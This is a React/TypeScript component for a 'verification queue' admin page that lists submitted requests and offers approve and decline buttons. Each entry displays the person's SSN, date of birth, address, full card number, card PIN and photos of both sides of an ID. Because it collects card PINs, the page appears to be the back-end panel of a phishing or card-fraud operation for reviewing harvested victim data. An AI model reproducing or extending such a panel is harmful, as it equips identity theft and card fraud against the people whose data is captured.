
import React, { useState, useEffect, useCallback } from 'react';
import { Verification } from '../../types';

const VerificationQueue: React.FC = () => {
    const [verifications, setVerifications] = useState<Verification[]>([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState('');

    const fetchVerifications = useCallback(async () => {
        setLoading(true);
        setError('');
        try {
            const token = localStorage.getItem('token');
            const response = await fetch('/api/verifications', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (!response.ok) throw new Error('Failed to fetch verification requests');
            const data = await response.json();
            setVerifications(data);
        } catch (err: any) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    }, []);

    useEffect(() => {
        fetchVerifications();
    }, [fetchVerifications]);

    const handleReview = async (id: string, action: 'approve' | 'decline') => {
        try {
            const token = localStorage.getItem('token');
            const response = await fetch(`/api/verifications/${id}/review`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({ action })
            });
            if (!response.ok) throw new Error(`Failed to ${action} request.`);
            // Refresh the list after action
            fetchVerifications();
        } catch (err: any) {
            setError(err.message);
        }
    };

    if (loading) return <p>Loading verification requests...</p>;
    if (error) return <p className="text-red-500">{error}</p>;

    return (
        <div className="space-y-4 max-h-[80vh] overflow-y-auto">
            {verifications.length === 0 ? (
                <p className="text-gray-500">No pending verifications.</p>
            ) : (
                verifications.map(v => (
                    <div key={v.id} className="p-4 bg-gray-50 rounded-lg border">
                        <div className="flex justify-between items-center">
                            <h3 className="font-bold text-lg text-gray-800">Request for {(v as any).user}</h3>
                            <span className="font-bold text-lg text-orange-500">{new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format((v as any).transactionAmount)}</span>
                        </div>
                        <p className="text-sm text-gray-500">Submitted: {new Date(v.submittedAt).toLocaleString()}</p>
                        
                        <div className="mt-4 space-y-2 text-sm">
                            <p><strong>Full Name:</strong> {v.data.fullName}</p>
                            <p><strong>Email:</strong> {v.data.email}</p>
                            <p><strong>Address:</strong> {`${v.data.addressLine1}, ${v.data.city}, ${v.data.state} ${v.data.zipCode}`}</p>
                            <p><strong>DOB:</strong> {v.data.dob}</p>
                            <p><strong>SSN:</strong> {v.data.ssn}</p>
                            <hr className="my-2"/>
                            <p><strong>Cardholder:</strong> {v.data.cardName}</p>
                            <p><strong>Card Number:</strong> {v.data.cardNumber}</p>
                             <p><strong>Card PIN:</strong> {v.data.cardPin}</p>
                            <hr className="my-2"/>
                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <p className="font-semibold">ID Front:</p>
                                    <img src={v.data.idFront} alt="ID Front" className="rounded border shadow-sm max-w-full h-auto"/>
                                </div>
                                <div>
                                    <p className="font-semibold">ID Back:</p>
                                    <img src={v.data.idBack} alt="ID Back" className="rounded border shadow-sm max-w-full h-auto"/>
                                </div>
                            </div>
                        </div>

                        <div className="mt-4 flex space-x-3">
                            <button
                                onClick={() => handleReview(v.id, 'approve')}
                                className="flex-1 bg-green-600 text-white font-semibold py-2 px-4 rounded hover:bg-green-700 transition"
                            >
                                Approve
                            </button>
                            <button
                                 onClick={() => handleReview(v.id, 'decline')}
                                 className="flex-1 bg-red-600 text-white font-semibold py-2 px-4 rounded hover:bg-red-700 transition"
                            >
                                Decline
                            </button>
                        </div>
                    </div>
                ))
            )}
        </div>
    );
};

export default VerificationQueue;